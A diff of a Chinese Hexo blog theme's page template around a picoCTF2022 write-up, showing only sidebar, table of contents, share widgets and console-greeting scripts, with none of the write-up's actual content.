+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">John Doe</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/07/10/picoCTF2022/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/07/10/picoCTF2022/')">picoCTF2022</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/07/10/picoCTF2022/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=picoCTF2022&amp;url=http://example.com/2025/07/10/picoCTF2022/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/WP/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>WP<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">初识栈溢出</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/11/HDCTF-2023-enc/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">[HDCTF 2023]enc</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/" title="御网杯线下2025"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-14</div><div class="title">御网杯线下2025</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vigenere"><span class="toc-number">1.1.</span> <span class="toc-text">Vigenere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-mod1"><span class="toc-number">1.2.</span> <span class="toc-text">basic-mod1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substitution0"><span class="toc-number">1.3.</span> <span class="toc-text">substitution0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Safe-Opener"><span class="toc-number">2.1.</span> <span class="toc-text">Safe Opener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB-test"><span class="toc-number">2.2.</span> <span class="toc-text">GDB test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fresh-java"><span class="toc-number">2.3.</span> <span class="toc-text">fresh-java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-run1"><span class="toc-number">2.4.</span> <span class="toc-text">file-run1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-run2"><span class="toc-number">2.5.</span> <span class="toc-text">file-run2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bbbbloat"><span class="toc-number">2.6.</span> <span class="toc-text">Bbbbloat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unpackme"><span class="toc-number">2.7.</span> <span class="toc-text">unpackme</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RPS"><span class="toc-number">3.1.</span> <span class="toc-text">RPS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">3.1.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-file-exploit-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">basic-file-exploit 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-number">3.3.</span> <span class="toc-text">buffer overflow 0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-number">4.</span> <span class="toc-text">buffer overflow 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buffer-overflow-2"><span class="toc-number">4.1.</span> <span class="toc-text">buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb%E5%8A%A8%E8%B0%83%E6%9F%A5%E7%9C%8B"><span class="toc-number">4.1.1.</span> <span class="toc-text">gdb动调查看</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-3"><span class="toc-number">4.1.2.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x-sixty-what"><span class="toc-number">4.2.</span> <span class="toc-text">x-sixty-what</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1"><span class="toc-number">4.2.1.</span> <span class="toc-text">堆栈平衡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-4"><span class="toc-number">4.2.2.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">格式化字符串</a><time datetime="2025-07-21T01:05:48.000Z" title="Created 2025-07-21 09:05:48">2025-07-21</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/20/HarekazeCTF2019-baby-rop2/" title="ret2libc-printf">ret2libc-printf</a><time datetime="2025-07-20T06:53:58.000Z" title="Created 2025-07-20 14:53:58">2025-07-20</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/18/ciscn-2019-es-2/" title="ciscn_2019_es_2">ciscn_2019_es_2</a><time datetime="2025-07-18T11:03:47.000Z" title="Created 2025-07-18 19:03:47">2025-07-18</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/18/bjdctf-2020-babystack2/" title="bjdctf_2020_babystack2">bjdctf_2020_babystack2</a><time datetime="2025-07-18T09:18:45.000Z" title="Created 2025-07-18 17:18:45">2025-07-18</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/17/Youngter-drive/" title="Youngter-drive">Youngter-drive</a><time datetime="2025-07-17T12:30:33.000Z" title="Created 2025-07-17 20:30:33">2025-07-17</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="John Doe" target="_blank">John Doe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 0.88rem;">BUU<sup>4</sup></a><a href="/tags/NSS/" style="font-size: 0.88rem;">NSS<sup>3</sup></a><a href="/tags/PWN/" style="font-size: 0.88rem;">PWN<sup>4</sup></a><a href="/tags/RC4/" style="font-size: 0.88rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 0.88rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 0.88rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 0.88rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 0.88rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 0.88rem;">WP<sup>2</sup></a><a href="/tags/printf/" style="font-size: 0.88rem;">printf<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 0.88rem;">pwn_study<sup>3</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 0.88rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 0.88rem;">动调<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 0.88rem;">栈溢出<sup>1</sup></a><a href="/tags/%E7%8C%9C%E6%95%B0/" style="font-size: 0.88rem;">猜数<sup>1</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 0.88rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
 
-  </article>
-  <!-- tag -->
-  <div class="mt-12 pt-6 border-t border-gray-200">
-    
-      
-        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
-          <a href="/tags/WP/">WP</a>
-        </span>
-      
-    
-  </div>
-  <!-- prev and next -->
-  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
-    <div>
-      
-        <a href="/2025/07/11/HDCTF-2023-enc/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
-          [HDCTF 2023]enc
-        </a>
-      
-    </div>
-    <div>
-      
-        <a href="/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          初识栈溢出
-          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
-        </a>
-      
-    </div>
-  </div>
-  <!-- comment -->
-  <div class="article-comments mt-12">
-    
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
 
-  </div>
-</section>
-<!-- js inspect -->
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
 
-<script src="/lib/clipboard.min.js"></script>
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 John Doe 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
 
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
 
-<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    "HTML-CSS": {
-        preferredFont: "TeX",
-        availableFonts: ["STIX","TeX"],
-        linebreaks: { automatic:true },
-        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
-    },
-    tex2jax: {
-        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
-        processEscapes: true,
-        ignoreClass: "tex2jax_ignore|dno",
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-        equationNumbers: { autoNumber: "AMS" },
-        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
-        Macros: { href: "{}" }
-    },
-    messageStyle: "none"
-  });
-</script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Queue(function() {
-      var all = MathJax.Hub.getAllJax(), i;
-      for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
       }
-  });
-</script>
+    }
+  }
 
+  typeof typed === 'object' && typed.destroy()
 
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
 
-<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
-<script>
-  $(document).ready(() => {
-    const maraidConfig = {
-      theme: "default",
-      logLevel: 3,
-      flowchart: { curve: "linear" },
-      gantt: { axisFormat: "%m/%d/%Y" },
-      sequence: { actorMargin: 50 },
-    };
-    mermaid.initialize(maraidConfig);
-  });
-</script>
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
 
-
-
-<script src="/lib/fancybox/fancybox.umd.min.js"></script>
-
-<script>
-  $(document).ready(() => {
-    $('.post-content').each(function(i){
-      $(this).find('img').each(function(){
-        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
-        var alt = this.alt;
-        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
